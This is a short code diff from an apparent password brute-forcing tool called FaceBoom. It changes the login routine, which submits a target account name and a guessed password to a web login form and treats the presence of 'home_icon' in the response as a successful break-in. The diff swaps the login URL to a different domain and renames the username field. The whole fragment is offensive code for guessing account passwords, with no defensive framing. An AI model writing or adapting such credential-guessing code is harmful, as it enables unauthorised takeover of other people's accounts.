@@ -84,9 +84,9 @@ class FaceBoom(object):
     def login(self,target, password):
 
         try:
-            self.br.open("https://goheadar.blogspot.com")
+            self.br.open("http://www.ahmedvipen.xyz")
             self.br.select_form(nr=0)
-            self.br.form['email']=target
+            self.br.form['user']=target
             self.br.form['pass']= password
             self.br.method ="POST"
             if self.br.submit().get_data().__contains__(b'home_icon'):return  1
